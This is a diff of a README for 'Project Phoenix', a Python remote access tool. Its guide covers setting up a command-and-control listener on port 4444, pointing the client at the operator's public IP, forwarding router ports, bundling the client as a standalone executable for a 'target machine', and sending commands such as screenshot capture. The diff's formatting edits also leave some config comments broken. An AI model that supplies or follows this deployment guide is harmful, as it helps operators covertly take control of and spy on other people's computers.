@@ -28,64 +28,64 @@ Project Phoenix is a comprehensive, open-source Remote Access Tool (RAT) designe
 
 ---
 
-## 🛠️ Installation & Setup
+# 🛠️ Installation & Setup
 
 Follow these steps to get Project Phoenix up and running.
 
-### Step 1: Clone the Repository
+## Step 1: Clone the Repository
 bash
 git clone [https://github.com/your-username/project-phoenix.git](https://github.com/your-username/project-phoenix.git)
 cd project-phoenix
 
-### Step 2: Install Dependencies
+## Step 2: Install Dependencies
 Install the required Python libraries on your server machine.
 
 bash
 pip install -r requirements.txt
 (Note: requirements.txt would contain pyautogui and any other server-side dependencies)
 
-### Step 3: Configure the C&C Server
+## Step 3: Configure the C&C Server
 Open the server/server.py file.
 Edit the HOST and PORT variables if necessary.
 HOST = '0.0.0.0' is recommended to listen on all network interfaces.
 PORT = 4444 is the default. Choose a port above 1024.
 python
-# --- EDIT THIS SECTION ---
+### --- EDIT THIS SECTION ---
 HOST = '0.0.0.0'  # Listen on all available network interfaces
 PORT = 4444        # The port you want to listen on
-# -------------------------
-### Step 4: Configure the RAT Client
+ -------------------------
+## Step 4: Configure the RAT Client
 Open the client/client.py file.
 Crucially, you must edit the SERVER_HOST variable.
 Replace 'YOUR_PUBLIC_IP_ADDRESS' with your machine's public IP address.
 Ensure SERVER_PORT matches the port you set in server.py.
 python
-# --- EDIT THIS SECTION ---
+ --- EDIT THIS SECTION ---
 SERVER_HOST = 'YOUR_PUBLIC_IP_ADDRESS' # MUST be your public IP
 SERVER_PORT = 4444 # MUST match the port in server.py
-# -------------------------
-### Step 5: Port Forwarding (CRITICAL)
+-------------------------
+## Step 5: Port Forwarding (CRITICAL)
 For the client to connect to your server over the internet, you must forward the chosen port on your router.
 
 Access your router's admin panel (usually 192.168.1.1).
 Navigate to the "Port Forwarding" or "Virtual Server" section.
 Create a rule to forward TCP traffic on your chosen PORT (e.g., 4444) to the local IP address of the machine running the server.
 🚀 Execution Guide
-### Step 1: Start the C&C Server (Listener)
+## Step 1: Start the C&C Server (Listener)
 On your machine, run the server script from the terminal.
 
 bash
 python server/server.py
 You should see the output: [*] Listening on 0.0.0.0:4444. Your server is now active and waiting for incoming connections.
 
-### Step 2: Prepare the Client Payload
+## Step 2: Prepare the Client Payload
 You can run the client in two ways:
 
-### Option A: Direct Python Execution
+## Option A: Direct Python Execution
 
 Requires Python to be installed on the target machine.
 Simply run python client/client.py.
-### Option B: Standalone Executable (Recommended)
+## Option B: Standalone Executable (Recommended)
 
 This bundles the script into a single .exe file that runs without Python.
 First, install PyInstaller: pip install pyinstaller
@@ -99,7 +99,7 @@ Execute the file.
 Step 4: Control the Target
 Once the client connects, your server terminal will display a confirmation message. You can now type commands and press Enter to send them to the target.
 
-Available Commands:
+#Available Commands:
 
 info: Retrieves detailed system information.
 screenshot: Captures the target's screen and sends it back.
